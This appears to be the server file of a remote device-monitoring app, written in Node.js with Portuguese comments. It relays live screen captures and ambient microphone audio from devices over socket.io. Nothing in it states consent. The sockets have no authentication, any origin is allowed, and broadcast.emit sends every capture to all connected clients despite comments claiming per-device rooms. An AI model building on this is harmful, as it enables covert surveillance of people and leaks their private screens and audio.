require('dotenv').config();
const express = require('express');
const http = require('http');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');

const { connect } = require('./config/db');

// Importando rotas
const authRouter = require('./routes/auth');
const devicesRouter = require('./routes/devices');
const dataRouter = require('./routes/data');
const mediaRouter = require('./routes/media');
const licensesRouter = require('./routes/licenses');

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true }));

// Configuração do PORT e MONGO_URI
const PORT = process.env.PORT || 3000;
const MONGO_URI = process.env.MONGO_URI;
if (!MONGO_URI) {
  console.error('Please set MONGO_URI in .env');
  process.exit(1);
}

// Conectar ao MongoDB
connect(MONGO_URI).catch((err) => {
  console.error(err);
  process.exit(1);
});

// Servindo arquivos estáticos do frontend
app.use(express.static(path.join(__dirname, 'frontend', 'public')));

// Rotas da API
app.use('/api/auth', authRouter);
app.use('/api/devices', devicesRouter);
app.use('/api/data', dataRouter);
app.use('/api/media', mediaRouter);
app.use('/api/licenses', licensesRouter);

// Rota de saúde
app.get('/api/health', (req, res) => res.json({ ok: true }));

// Rota fallback para SPA (Single Page Application)
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'frontend', 'public', 'index.html'));
});

// Iniciar servidor + WebSocket com socket.io
const server = http.createServer(app);
const { Server } = require('socket.io');
const io = new Server(server, { cors: { origin: '*' } });

// Funções de WebSocket para streaming e escuta ambiente
io.on('connection', (socket) => {
  console.log('Cliente conectado', socket.id);

  // Evento para o cliente se juntar a um "device room"
  socket.on('joinDevice', (deviceId) => {
    if (!deviceId) return;
    socket.join(`device:${deviceId}`);
    console.log(`Cliente ${socket.id} entrou no dispositivo ${deviceId}`);
  });

  // Evento para o cliente deixar o "device room"
  socket.on('leaveDevice', (deviceId) => {
    if (deviceId) {
      socket.leave(`device:${deviceId}`);
      console.log(`Cliente ${socket.id} saiu do dispositivo ${deviceId}`);
    }
  });

  // Evento de captura de tela (streaming)
  socket.on('screenCapture', (frameData) => {
    console.log('Recebendo captura de tela');
    // Envia a captura de tela para todos os outros clientes no mesmo "device room"
    socket.broadcast.emit('screenCapture', frameData);
  });

  // Evento de escuta de áudio (microfone)
  socket.on('audioCapture', (audioData) => {
    console.log('Recebendo áudio do ambiente');
    // Envia o áudio para todos os outros clientes no mesmo "device room"
    socket.broadcast.emit('audioCapture', audioData);
  });

  // Evento de desconexão
  socket.on('disconnect', () => {
    console.log('Cliente desconectado', socket.id);
  });
});

// Tornar o io disponível para as rotas
app.locals.io = io;

// Iniciar o servidor
server.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
});
